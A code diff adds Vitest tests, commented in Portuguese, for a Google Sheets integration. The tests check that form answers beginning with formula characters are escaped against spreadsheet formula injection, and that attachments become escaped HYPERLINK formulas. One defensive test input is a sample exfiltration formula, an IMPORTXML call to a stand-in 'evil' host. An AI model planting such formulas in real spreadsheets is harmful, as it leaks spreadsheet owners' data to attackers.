@@ -15,7 +15,7 @@
  * cliente passa a mostrar o valor de uma coluna sob o nome de outra.
  */
 import { describe, it, expect } from 'vitest'
-import { computeSheetHeaders, parseRowIndexFromRange } from './google-sheets'
+import { computeSheetHeaders, parseRowIndexFromRange, protegerCelula, celulaDeArquivo} from './google-sheets'
 
 const UTMS = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term']
 const COMPLETA = ['Data/Hora', 'response_id', 'status', 'Qual seu nome?', 'meta_events', ...UTMS]
@@ -136,5 +136,28 @@ describe('parseRowIndexFromRange', () => {
     expect(parseRowIndexFromRange(undefined)).toBe(null)
     expect(parseRowIndexFromRange('')).toBe(null)
     expect(parseRowIndexFromRange('Respostas!')).toBe(null)
+  })
+})
+
+describe('🛡️ USER_ENTERED sem injeção de fórmula (18/08)', () => {
+  it('resposta de lead que começa com caractere de fórmula ganha o apóstrofo', () => {
+    // Sem isto, "=IMPORTXML(...)" digitado por um LEAD executaria na planilha do CLIENTE —
+    // exfiltração clássica. O escudo é a condição de segurança do USER_ENTERED existir.
+    expect(protegerCelula('=IMPORTXML("https://evil","//a")')).toMatch(/^'/)
+    expect(protegerCelula('+5583999999999')).toBe("'+5583999999999")
+    expect(protegerCelula('-2')).toBe("'-2")
+    expect(protegerCelula('@menção')).toBe("'@menção")
+  })
+
+  it('texto normal passa intacto', () => {
+    expect(protegerCelula('resposta comum')).toBe('resposta comum')
+    expect(protegerCelula('')).toBe('')
+  })
+
+  it('anexo vira =HYPERLINK clicável, com aspas escapadas', () => {
+    // Pedido do Sidney no 1º teste real: "na planilha o link deveria aparecer clicável".
+    // Texto "nome (url)" não linkifica nem em USER_ENTERED — só fórmula.
+    const f = celulaDeArquivo('relatório "final".pdf', 'https://eidosform.com.br/arquivo/abc')
+    expect(f).toBe('=HYPERLINK("https://eidosform.com.br/arquivo/abc";"relatório ""final"".pdf")')
   })
 })
